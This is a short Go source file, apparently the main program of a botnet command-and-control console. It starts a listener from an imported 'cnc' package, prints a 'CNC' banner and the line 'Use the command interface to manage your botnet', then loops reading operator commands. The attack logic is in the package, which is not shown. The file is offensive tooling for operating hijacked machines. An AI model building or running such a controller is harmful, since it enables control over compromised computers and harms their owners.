package main

import (
	"fmt"

	"bufio"
	"os"

	"github.com/vincentdc94/cnc"
)

/**

Make list with
*/

func main() {

	cnc.ClearScreenCommand()

	go cnc.BeginListen()

	fmt.Print(" ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄ \n" +
		"▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌\n" +
		"▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ \n" +
		"▐░▌          ▐░▌▐░▌    ▐░▌▐░▌             \n" +
		"▐░▌          ▐░▌ ▐░▌   ▐░▌▐░▌              \n" +
		"▐░▌          ▐░▌  ▐░▌  ▐░▌▐░▌               \n" +
		"▐░▌          ▐░▌   ▐░▌ ▐░▌▐░▌               \n" +
		"▐░▌          ▐░▌    ▐░▌▐░▌▐░▌               \n" +
		"▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄▄▄      \n" +
		"▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌     \n" +
		" ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀      \n")
	fmt.Println("\n\nUse the command interface to manage your botnet. Type 'list' for all available commands\n")

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("cnc>")
		command, _ := reader.ReadString('\n')

		cnc.CheckCommand(command)
	}

}
